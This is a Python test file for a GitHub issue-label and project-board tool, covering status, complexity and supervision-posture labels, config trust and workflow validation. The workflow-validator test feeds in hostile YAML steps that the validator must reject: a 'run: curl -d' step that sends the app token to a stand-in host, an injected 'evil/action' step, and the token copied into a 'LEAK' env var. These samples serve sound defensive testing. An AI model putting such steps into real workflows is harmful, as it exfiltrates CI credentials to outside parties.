            (["issue", "edit", "7", "--repo", "acme/widget",
              "--add-label", "status:in-progress"], _ok("")),
        ])
        result = lb.verb_sub_status(7, "in_progress", self.ctx, runner)
        self.assertEqual((result["sub_status"], result["label"]),
                         ("in_progress", "status:in-progress"))
        # Idempotent label upsert uses --force.
        self.assertIn("--force", runner.calls[1])

    def test_swap_removes_prior_status_label_and_adds_target(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "8", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-progress", "bug"])),
            (["label", "create", "status:in-review", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "8", "--repo", "acme/widget",
              "--add-label", "status:in-review",
              "--remove-label", "status:in-progress"], _ok("")),
        ])
        result = lb.verb_sub_status(8, "in_review", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["status:in-progress"])

    def test_resetting_current_status_is_a_noop_edit(self) -> None:
        # Already in_review: ensure the label but make NO issue-edit (nothing to change).
        runner = FakeRunner([
            (["issue", "view", "9", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-review"])),
            (["label", "create", "status:in-review", "--repo", "acme/widget"], _ok("")),
        ])
        result = lb.verb_sub_status(9, "in_review", self.ctx, runner)
        self.assertEqual(result["sub_status"], "in_review")
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_done_strips_labels_and_closes_open_issue(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "10", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-review"], state="OPEN")),
            (["issue", "edit", "10", "--repo", "acme/widget",
              "--remove-label", "status:in-review"], _ok("")),
            (["issue", "close", "10", "--repo", "acme/widget", "--reason", "completed"], _ok("")),
        ])
        result = lb.verb_sub_status(10, "done", self.ctx, runner)
        self.assertEqual((result["sub_status"], result["closed"]), ("done", True))

    def test_done_on_already_closed_issue_only_reconciles_labels(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "11", "--repo", "acme/widget", "--json", "labels,state"],
             self._view([], state="CLOSED")),
        ])
        result = lb.verb_sub_status(11, "done", self.ctx, runner)
        self.assertEqual((result["closed"], result["removed_labels"]), (False, []))
        self.assertFalse(any(c[:2] == ["issue", "close"] for c in runner.calls))

    def test_missing_issue_is_issue_not_found(self) -> None:
        miss = subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                           stderr="Could not resolve to an Issue with the number of 99.")
        runner = FakeRunner([
            (["issue", "view", "99", "--repo", "acme/widget", "--json", "labels,state"], miss),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_sub_status(99, "blocked", self.ctx, runner)
        self.assertEqual(caught.exception.code, "issue_not_found")


class ComplexityLabelWriterTest(unittest.TestCase):
    """apply_complexity_label drives the mutually-exclusive `complexity:*` labels
    board-free, mirroring the status:* upsert-then-attach path."""

    def setUp(self) -> None:
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    @staticmethod
    def _view(labels):
        return _ok(json.dumps({"labels": [{"name": n} for n in labels]}))

    def test_invalid_tier_rejected_before_any_gh_call(self) -> None:
        runner = FakeRunner([])  # any call would raise "unexpected gh call"
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_complexity_label(7, "epic", self.ctx, runner)
        self.assertEqual(caught.exception.code, "invalid_complexity")
        self.assertEqual(runner.calls, [])

    def test_fresh_issue_ensures_label_and_adds_it(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "7", "--repo", "acme/widget", "--json", "labels"],
             self._view([])),
            (["label", "create", "complexity:medium", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "7", "--repo", "acme/widget",
              "--add-label", "complexity:medium"], _ok("")),
        ])
        result = lb.apply_complexity_label(7, "medium", self.ctx, runner)
        self.assertEqual((result["complexity"], result["label"]),
                         ("medium", "complexity:medium"))
        self.assertEqual(result["removed_labels"], [])
        self.assertIn("--force", runner.calls[1])  # idempotent upsert

    def test_swap_removes_prior_complexity_label_and_adds_target(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "8", "--repo", "acme/widget", "--json", "labels"],
             self._view(["complexity:high", "bug"])),
            (["label", "create", "complexity:low", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "8", "--repo", "acme/widget",
              "--add-label", "complexity:low",
              "--remove-label", "complexity:high"], _ok("")),
        ])
        result = lb.apply_complexity_label(8, "low", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["complexity:high"])

    def test_reapplying_current_tier_is_a_noop_edit(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "9", "--repo", "acme/widget", "--json", "labels"],
             self._view(["complexity:medium"])),
            (["label", "create", "complexity:medium", "--repo", "acme/widget"], _ok("")),
        ])
        result = lb.apply_complexity_label(9, "medium", self.ctx, runner)
        self.assertEqual(result["complexity"], "medium")
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_missing_issue_is_issue_not_found(self) -> None:
        miss = subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                           stderr="Could not resolve to an Issue with the number of 99.")
        runner = FakeRunner([
            (["issue", "view", "99", "--repo", "acme/widget", "--json", "labels"], miss),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_complexity_label(99, "high", self.ctx, runner)
        self.assertEqual(caught.exception.code, "issue_not_found")


class PostureLabelWriterTest(unittest.TestCase):
    """apply_posture_label drives the mutually-exclusive `posture:*` labels
    board-free, mirroring the complexity writer's upsert-then-attach path —
    with one asymmetry: `autonomous` (the default) has no label, so applying
    it is a PURE removal (the case complexity has no analogue for)."""

    def setUp(self) -> None:
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    @staticmethod
    def _view(labels):
        return _ok(json.dumps({"labels": [{"name": n} for n in labels]}))

    def test_invalid_value_rejected_before_any_gh_call(self) -> None:
        runner = FakeRunner([])  # any call would raise "unexpected gh call"
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_posture_label(7, "yolo", self.ctx, runner)
        self.assertEqual(caught.exception.code, "invalid_posture")
        self.assertEqual(runner.calls, [])

    def test_fresh_issue_ensures_label_and_adds_it(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "7", "--repo", "acme/widget", "--json", "labels"],
             self._view([])),
            (["label", "create", "posture:standard", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "7", "--repo", "acme/widget",
              "--add-label", "posture:standard"], _ok("")),
        ])
        result = lb.apply_posture_label(7, "standard", self.ctx, runner)
        self.assertEqual((result["posture"], result["label"]),
                         ("standard", "posture:standard"))
        self.assertEqual(result["removed_labels"], [])
        self.assertIn("--force", runner.calls[1])  # idempotent upsert

    def test_reapplying_standard_is_a_noop_edit(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "9", "--repo", "acme/widget", "--json", "labels"],
             self._view(["posture:standard"])),
            (["label", "create", "posture:standard", "--repo", "acme/widget"], _ok("")),
        ])
        result = lb.apply_posture_label(9, "standard", self.ctx, runner)
        self.assertEqual(result["posture"], "standard")
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_autonomous_strips_an_existing_standard_label(self) -> None:
        # The case complexity has no analogue for: `autonomous` writes no label
        # of its own, so applying it to an issue carrying `posture:standard`
        # must be a PURE removal — the path back to the hands-off default, not
        # a no-op.
        runner = FakeRunner([
            (["issue", "view", "8", "--repo", "acme/widget", "--json", "labels"],
             self._view(["posture:standard", "bug"])),
            (["issue", "edit", "8", "--repo", "acme/widget",
              "--remove-label", "posture:standard"], _ok("")),
        ])
        result = lb.apply_posture_label(8, "autonomous", self.ctx, runner)
        self.assertEqual(result["posture"], "autonomous")
        self.assertIsNone(result["label"])
        self.assertEqual(result["removed_labels"], ["posture:standard"])
        # No `label create` call — "autonomous" has no label to ensure/self-heal.
        self.assertFalse(any(c[:2] == ["label", "create"] for c in runner.calls))

    def test_stray_posture_label_is_stripped_when_supervising(self) -> None:
        # Regression (review of PR #304): `present` used to be computed by
        # membership in ALL_POSTURE_LABELS, which holds only the one written
        # label — so a stray `posture:*` label from outside the vocabulary
        # (e.g. a legacy `posture:autonomous`) survived, leaving BOTH labels
        # on the issue. Strip by namespace instead.
        runner = FakeRunner([
            (["issue", "view", "11", "--repo", "acme/widget", "--json", "labels"],
             self._view(["posture:autonomous", "bug"])),
            (["label", "create", "posture:standard", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "11", "--repo", "acme/widget",
              "--add-label", "posture:standard",
              "--remove-label", "posture:autonomous"], _ok("")),
        ])
        result = lb.apply_posture_label(11, "standard", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["posture:autonomous"])

    def test_case_variant_stray_label_is_stripped(self) -> None:
        # Second review pass on PR #304: the namespace scan was case-SENSITIVE,
        # so a hand-typed case-variant label was invisible to it. GitHub treats
        # label names case-insensitively for uniqueness, so that label is one a
        # human can really create — and missing it would leave two `posture:*`
        # labels on the issue.
        runner = FakeRunner([
            (["issue", "view", "13", "--repo", "acme/widget", "--json", "labels"],
             self._view(["Posture:Autonomous"])),
            (["label", "create", "posture:standard", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "13", "--repo", "acme/widget",
              "--add-label", "posture:standard",
              "--remove-label", "Posture:Autonomous"], _ok("")),
        ])
        result = lb.apply_posture_label(13, "standard", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["Posture:Autonomous"])

    def test_vocabulary_and_prefix_cannot_drift(self) -> None:
        # POSTURE_LABEL_PREFIX is what both the writer and the reader police; if
        # it ever stopped matching the label POSTURE_LABELS actually writes, the
        # scan would match nothing and a supervision opt-out would silently
        # never engage.
        for label in lb.POSTURE_LABELS.values():
            self.assertTrue(label.startswith(lb.POSTURE_LABEL_PREFIX), label)
        for label in lb.ALL_POSTURE_LABELS:
            self.assertTrue(label.startswith(lb.POSTURE_LABEL_PREFIX), label)

    def test_stray_posture_label_is_removable_via_autonomous(self) -> None:
        # Same regression, the other direction: applying `autonomous` to an
        # issue carrying only a stray `posture:*` label used to issue NO edit
        # at all, making the stray label unremovable through the engine — and,
        # under the any-label-is-supervision read, pinning the ticket to
        # `standard` forever.
        runner = FakeRunner([
            (["issue", "view", "12", "--repo", "acme/widget", "--json", "labels"],
             self._view(["posture:autonomous"])),
            (["issue", "edit", "12", "--repo", "acme/widget",
              "--remove-label", "posture:autonomous"], _ok("")),
        ])
        result = lb.apply_posture_label(12, "autonomous", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["posture:autonomous"])

    def test_autonomous_on_a_bare_issue_is_a_noop(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "10", "--repo", "acme/widget", "--json", "labels"],
             self._view([])),
        ])
        result = lb.apply_posture_label(10, "autonomous", self.ctx, runner)
        self.assertEqual(result["removed_labels"], [])
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_missing_issue_is_issue_not_found(self) -> None:
        miss = subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                           stderr="Could not resolve to an Issue with the number of 99.")
        runner = FakeRunner([
            (["issue", "view", "99", "--repo", "acme/widget", "--json", "labels"], miss),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_posture_label(99, "standard", self.ctx, runner)
        self.assertEqual(caught.exception.code, "issue_not_found")


class ResolveClearanceTest(unittest.TestCase):
    """The pure read-side core: autonomous unless the ticket opted into
    supervision. Any `posture:*` label — recognized, hand-typed, legacy, or
    from a future vocabulary — resolves `standard`; a label can only reduce
    autonomy, never grant it."""

    # (labels, expected posture, why)
    TRUTH_TABLE = [
        ([], "autonomous",
         "unlabeled is the hands-off default"),
        (["complexity:high", "status:in-progress"], "autonomous",
         "other namespaces are not posture labels"),
        (["posture:standard"], "standard",
         "the one written opt-out"),
        (["complexity:high", "posture:standard"], "standard",
         "an unrelated namespace does not disturb the opt-out"),
        (["posture:autonomous"], "standard",
         "a legacy grant label now de-escalates — any label reduces autonomy"),
        (["posture:autonomous", "posture:standard"], "standard",
         "conflicting labels still resolve toward supervision"),
        (["posture:supervised"], "standard",
         "a value from a future vocabulary is never read as permission"),
        (["Posture:Standard"], "standard",
         "the namespace scan is case-insensitive"),
    ]

    def test_truth_table(self) -> None:
        for labels, posture, why in self.TRUTH_TABLE:
            with self.subTest(labels=labels, why=why):
                self.assertEqual(lb.resolve_clearance(labels),
                                 {"posture": posture})

    def test_any_posture_label_deescalates(self) -> None:
        # The property stated as one invariant rather than read off the table:
        # `autonomous` is reachable ONLY with zero `posture:*` labels.
        # Everything else — recognized, unrecognized, or conflicting — is
        # `standard`, so no label edit can ever grant hands-off execution.
        for labels, posture, why in self.TRUTH_TABLE:
            with self.subTest(labels=labels, why=why):
                has_posture_label = any(l.lower().startswith("posture:") for l in labels)
                self.assertEqual(posture, "standard" if has_posture_label else "autonomous")


class ConfigTest(unittest.TestCase):
    def test_parse_origin_forms(self) -> None:
        self.assertEqual(lb.parse_origin("git@github.com:a/b.git"), ("a", "b"))
        self.assertEqual(lb.parse_origin("https://github.com/a/b"), ("a", "b"))
        self.assertEqual(lb.parse_origin("https://github.com/a/b.git"), ("a", "b"))

    def test_owner_mismatch_is_hard_error(self) -> None:
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            with self.assertRaises(lb.BoardError) as caught:
                lb.read_board_config(ctx)
            self.assertEqual(caught.exception.code, "owner_mismatch")

    def test_trusted_foreign_owner_via_git_config_is_accepted(self) -> None:
        # The trust store lives out-of-band in .git/config — unreachable by any
        # PR. An in-file allowlist is intentionally NOT read (self-referential).
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "-C", tmp, "init", "-q"], check=True,
                           capture_output=True, text=True)
            subprocess.run(["git", "-C", tmp, "config",
                            "agentic.trustedBoardOwners", "canonical"],
                           check=True, capture_output=True, text=True)
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: canonical\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="fork-owner",
                                 origin_repo="r", default_branch="main")
            board = lb.read_board_config(ctx)
            self.assertEqual((board.owner, board.number), ("canonical", 9))

    def test_in_file_allowlist_is_not_trusted(self) -> None:
        # An attacker PR that sets owner AND a self-referential allowlist must
        # still be rejected — the allowlist key is no longer honored.
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 9\n"
                "github_project_owner_allowlist: attacker\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            with self.assertRaises(lb.BoardError) as caught:
                lb.read_board_config(ctx)
            self.assertEqual(caught.exception.code, "owner_mismatch")

    def test_tracked_local_config_is_ignored(self) -> None:
        # A .local.md committed to git (would ride a PR) must be ignored; the
        # committed config is used instead.
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "-C", tmp, "init", "-q"], check=True,
                           capture_output=True, text=True)
            (Path(tmp) / "agentic-engineering.local.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 1\n---\n",
                encoding="utf-8")
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: victim\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            subprocess.run(["git", "-C", tmp, "add", "agentic-engineering.local.md"],
                           check=True, capture_output=True, text=True)
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            board = lb.read_board_config(ctx)
            # Fell through to committed config (owner==origin), not the tracked local.
            self.assertEqual((board.owner, board.number, board.source), ("victim", 9, "committed"))

    def test_parse_origin_rejects_repo_less_url(self) -> None:
        # host must never be captured as the owner (verified bug).
        self.assertEqual(lb.parse_origin("https://github.com/justowner"), ("", ""))


class RetryTimeoutTest(unittest.TestCase):
    def test_retry_on_secondary_limit_then_success(self) -> None:
        import unittest.mock as mock
        responses = [
            subprocess.CompletedProcess([], 1, "", "HTTP 403 secondary rate limit"),
            _ok("{}"),
        ]

        def runner(args, timeout=None):
            return responses.pop(0)

        with mock.patch.object(lb.time, "sleep") as slept:
            result = lb._run_gh_retry(runner, ["api", "user"])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(responses, [])   # both consumed → exactly 2 calls
        slept.assert_called_once()

    def test_run_gh_raises_board_error_on_timeout(self) -> None:
        import unittest.mock as mock
        with mock.patch.object(lb.shutil, "which", return_value="/usr/bin/gh"), \
                mock.patch.object(lb.subprocess, "run",
                                  side_effect=subprocess.TimeoutExpired(cmd="gh", timeout=1)):
            with self.assertRaises(lb.BoardError) as caught:
                lb.run_gh(["api", "user"])
        self.assertEqual(caught.exception.code, "gh_timeout")


def _issue_item(number, repo="acme/widget", type_="Issue"):
    return {"content": {"type": type_, "number": number, "repository": repo,
                        "title": f"i{number}"}}


def _parents_batch(numbers, parents=None, null_for=()):
    """A `_batched_parent_numbers` GraphQL reply for `numbers`. `parents` maps a
    number to its parent number (a sub-issue); numbers in `null_for` come back as
    a null alias (an unreadable node the caller must fail toward not-adding);
    every other number is parentless."""
    parents = parents or {}
    null_for = set(null_for)
    nodes = {}
    for n in numbers:
        if n in null_for:
            nodes[f"i{n}"] = None
            continue
        p = parents.get(n)
        nodes[f"i{n}"] = {"parent": {"number": p} if p is not None else None}
    return json.dumps({"data": {"repository": nodes}})


class ConfigKeysWriteTest(unittest.TestCase):
    """write_config_keys / upsert_frontmatter_keys: the single committed-config
    write path (moved from bootstrap). Byte-preservation + atomicity."""

    def _tmp(self):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        return d.name

    def test_creates_file_with_all_keys_in_one_write(self) -> None:
        root = self._tmp()
        path = lb.write_config_keys(root, {
            "github_project_owner": "acme", "github_project_number": "5",
            lb.CONFIG_KEY_FORWARD_BINDING: "workflow-only"})
        meta = lb.parse_frontmatter(Path(path).read_text(encoding="utf-8"))
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta["github_project_number"], "5")
        self.assertEqual(meta[lb.CONFIG_KEY_FORWARD_BINDING], "workflow-only")

    def test_upsert_preserves_body_and_unrelated_keys(self) -> None:
        text = ("---\ntitle: Cfg\ngithub_project_owner: old\n"
                "github_project_number: 1\nkeep: me\n---\n\n# Notes\n\nbody\n")
        out = lb.upsert_frontmatter_keys(text, {
            "github_project_owner": "acme", lb.CONFIG_KEY_BACKFILLED_THROUGH: "42"})
        meta = lb.parse_frontmatter(out)
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta["github_project_number"], "1")  # untouched
        self.assertEqual(meta["keep"], "me")
        self.assertEqual(meta[lb.CONFIG_KEY_BACKFILLED_THROUGH], "42")
        self.assertIn("# Notes", out)
        self.assertIn("body", out)

    def test_updates_every_occurrence_of_a_duplicate_key(self) -> None:
        # parse_frontmatter is last-wins: a duplicate key left un-updated would
        # make the write a silent no-op. Both occurrences must become the new value.
        text = ("---\ngithub_project_owner: old\ngithub_project_number: 1\n"
                "github_project_owner: older\n---\nbody\n")
        out = lb.upsert_frontmatter_keys(text, {"github_project_owner": "new"})
        self.assertEqual(lb.parse_frontmatter(out)["github_project_owner"], "new")
        self.assertNotIn("older", out)

    def test_crlf_file_keeps_crlf_on_rewritten_lines(self) -> None:
        # Byte-preservation: a rewritten line must not flip \r\n to bare \n.
        text = "---\r\ngithub_project_owner: old\r\ngithub_project_number: 1\r\n---\r\nbody\r\n"
        out = lb.upsert_frontmatter_keys(text, {"github_project_owner": "new"})
        self.assertIn("github_project_owner: new\r\n", out)
        self.assertNotIn("github_project_owner: new\n", out.replace("\r\n", "\r\r"))  # no bare LF
        self.assertEqual(lb.parse_frontmatter(out)["github_project_owner"], "new")
        self.assertIn("body", out)

    def test_marker_write_only_touches_its_key(self) -> None:
        # A backfill marker write must not disturb identity or forward binding.
        root = self._tmp()
        lb.write_config_keys(root, {"github_project_owner": "acme",
                                    "github_project_number": "5",
                                    lb.CONFIG_KEY_FORWARD_BINDING: "auto-add"})
        lb.write_config_keys(root, {lb.CONFIG_KEY_BACKFILLED_THROUGH: "99"})
        meta = lb.parse_frontmatter(
            (Path(root) / lb.COMMITTED_CONFIG).read_text(encoding="utf-8"))
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta[lb.CONFIG_KEY_FORWARD_BINDING], "auto-add")
        self.assertEqual(meta[lb.CONFIG_KEY_BACKFILLED_THROUGH], "99")


class BindingConfigTest(unittest.TestCase):
    """read_binding_config: enum validation, backfill marker, unset degrade."""

    def _ctx_with(self, body):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        (Path(d.name) / lb.COMMITTED_CONFIG).write_text(body, encoding="utf-8")
        return lb.RepoContext(root=d.name, main_root=d.name, origin_owner="acme",
                              origin_repo="widget", default_branch="main")

    def test_reads_valid_forward_binding_and_marker(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_forward_binding: auto-add\n"
            "github_project_backfilled_through: 42\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertEqual(b.forward_binding, "auto-add")
        self.assertEqual(b.backfilled_through, 42)
        self.assertEqual(b.source, "committed")

    def test_unrecognized_forward_binding_degrades_to_none_but_keeps_raw(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_forward_binding: bogus\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertIsNone(b.forward_binding)   # not a valid enum
        self.assertEqual(b.forward_raw, "bogus")  # preserved for the doctor WARN

    def test_unset_when_only_identity_present(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertIsNone(b.forward_binding)
        self.assertEqual(b.forward_raw, "")
        self.assertIsNone(b.backfilled_through)

    def test_local_override_of_one_key_does_not_mask_the_other(self) -> None:
        # Orthogonal keys resolve independently: a .local that sets only the
        # forward binding must NOT hide the committed backfill marker (a single
        # first-hit-wins scan would, breaking verb_backfill's `prior` read).
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        root = d.name
        (Path(root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_backfilled_through: 40\n---\n", encoding="utf-8")
        (Path(root) / lb.LOCAL_CONFIG).write_text(
            "---\ngithub_project_forward_binding: auto-add\n---\n", encoding="utf-8")
        ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                             origin_repo="widget", default_branch="main")
        b = lb.read_binding_config(ctx)
        self.assertEqual(b.forward_binding, "auto-add")   # from .local
        self.assertEqual(b.backfilled_through, 40)         # still seen from committed


class AutoAddWorkflowTest(unittest.TestCase):
    def _ctx(self):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        return lb.RepoContext(root=d.name, main_root=d.name, origin_owner="acme",
                              origin_repo="widget", default_branch="main"), Path(d.name)

    def test_finds_add_to_project_workflow(self) -> None:
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "add-to-project.yml").write_text(
            "on: issues\njobs:\n  a:\n    steps:\n      - uses: actions/add-to-project@v2\n",
            encoding="utf-8")
        self.assertEqual(lb._auto_add_candidates(ctx)[0][0], ".github/workflows/add-to-project.yml")

    def test_none_when_no_workflows_dir(self) -> None:
        ctx, _ = self._ctx()
        self.assertEqual(lb._auto_add_candidates(ctx), [])

    def test_none_when_workflow_unrelated(self) -> None:
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("on: push\njobs: {}\n", encoding="utf-8")
        self.assertEqual(lb._auto_add_candidates(ctx), [])

    def _write(self, text):
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "add.yml").write_text(text, encoding="utf-8")
        return ctx

    def test_structurally_validates_legacy_pat_workflow(self) -> None:
        """Repos bootstrapped from older plugin versions must keep passing —
        the doctor does not force an App setup on a repo that never needed one."""
        url = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
            "      - uses: actions/add-to-project@" + "a" * 40 + "\n"
            "        with:\n          project-url: " + url + "\n"
            "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, url)
        self.assertTrue(inspection.valid, inspection.detail)

    def test_structurally_validates_app_token_workflow(self) -> None:
        """The shape bootstrap emits now, matching the merged board repos."""
        url = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
            "      - uses: actions/create-github-app-token@" + "b" * 40 + "  # v3\n"
            "        id: app-token\n        with:\n"
            "          client-id: ${{ vars.LWD_APP_CLIENT_ID }}\n"
            "          private-key: ${{ secrets.LWD_APP_PRIVATE_KEY }}\n"
            "          owner: acme\n"
            "      - uses: actions/add-to-project@" + "a" * 40 + "  # v2\n"
            "        with:\n          project-url: " + url + "\n"
            "          github-token: ${{ steps.app-token.outputs.token }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, url)
        self.assertTrue(inspection.valid, inspection.detail)

    def test_step_guards_do_not_fire_on_legitimate_yaml(self) -> None:
        """Positive control for the widened `uses:`/`run:` key guards and the
        flow-style rejection. Every other case here is a rejection, so a future
        broadening of those regexes would keep the suite green while turning the
        doctor red on working repos. These three constructs must keep passing:
        a flow SEQUENCE that is not a step, `permissions: {}`, and the scaffold's
        own comment telling the reader not to add `run:` steps."""
        url = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "# SECURITY: do NOT add `run:` steps that interpolate issue content\n"
            "on:\n  issues:\n    types: [opened]\n\npermissions: {}\n\n"
            "jobs:\n  add:\n    permissions: {}\n    steps:\n"
            "      - uses: actions/add-to-project@" + "a" * 40 + "\n"
            "        with:\n          project-url: " + url + "\n"
            "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, url)
        self.assertTrue(inspection.valid, inspection.detail)

    def test_rejects_broken_app_token_wiring(self) -> None:
        url = "https://github.com/orgs/acme/projects/5"
        app = ("      - uses: actions/create-github-app-token@" + "b" * 40 + "\n"
               "        id: app-token\n        with:\n"
               "          client-id: ${{ vars.LWD_APP_CLIENT_ID }}\n"
               "          private-key: ${{ secrets.LWD_APP_PRIVATE_KEY }}\n")
        head = "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
        adder = ("      - uses: actions/add-to-project@" + "a" * 40 + "\n"
                 "        with:\n          project-url: " + url + "\n")
        cases = {
            # The token output must come from the App step, not an unrelated id.
            "unknown_step_id": head + app + adder
            + "          github-token: ${{ steps.other.outputs.token }}\n",
            # A moving tag on the App step runs with the private key in scope.
            "app_step_moving_tag": head
            + app.replace("@" + "b" * 40, "@v3") + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
            # A third action would run inside the credential-bearing job.
            "extra_action": head + app
            + "      - uses: evil/action@" + "c" * 40 + "\n" + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
            # The run-step guard survives the widened credential shapes.
            "run_step": head + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
            + "      - run: echo '${{ github.event.issue.title }}'\n",
            # A step may spell its keys in any order: `uses:` off the dash line
            # is still an action running with the App key in scope.
            "name_first_extra_step": head + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
            + "      - name: exfil\n        uses: evil/action@v1\n",
            # Flow style hides a whole step on one line, past every block anchor.
            "flow_style_extra_step": head + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
            + "      - {uses: evil/action@v1}\n",
            "flow_style_run": head + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
            + "      - {run: curl -d ${{ steps.app-token.outputs.token }} evil.invalid}\n",
            # A quoted key is the same key.
            "quoted_run_key": head + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
            + "      - name: x\n        'run': curl evil.invalid\n",
            # The token must be named only where it is consumed.
            "token_copied_to_job_env": head.replace(
                "  add:\n    steps:\n",
                "  add:\n    env:\n      LEAK: ${{ steps.app-token.outputs.token }}\n    steps:\n")
            + app + adder
            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
        }
        for name, text in cases.items():
            with self.subTest(case=name):
                inspection = lb.inspect_auto_add_workflow(self._write(text), url)
                self.assertFalse(inspection.valid, inspection.detail)

    def test_rejects_wrong_trigger_moving_ref_url_and_secret(self) -> None:
        expected = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "on:\n  issues:\n    types: [reopened]\njobs:\n  add:\n    steps:\n"
            "      - uses: actions/add-to-project@v2\n        with:\n"
            "          project-url: https://github.com/users/acme/projects/5\n"
            "          github-token: ${{ secrets.WRONG }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, expected)
        self.assertFalse(inspection.valid)
        for fragment in ("issues/opened", "40-character", "project-url", "ADD_TO_PROJECT_PAT"):
            self.assertIn(fragment, inspection.detail)
